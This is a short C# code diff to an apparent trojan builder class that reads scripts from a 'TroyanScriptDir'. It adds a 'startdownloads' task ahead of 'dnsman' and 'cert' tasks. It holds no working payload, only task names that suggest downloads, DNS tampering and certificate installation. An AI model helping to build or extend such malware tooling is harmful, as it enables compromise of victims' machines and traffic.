@@ -4,7 +4,7 @@ public abstract class BodyBuilder: CustomBuilder
 {
     protected override string SourceDir => Model.TroyanScriptDir;
     
-    protected override string[] PriorityTasks => new [] {"dnsman", "cert" };
+    protected override string[] PriorityTasks => new [] {"startdownloads", "dnsman", "cert" };
     protected override string[] UnpriorityTasks => new [] {"extraupdate" };
     protected override string EntryPoint => "program";
 
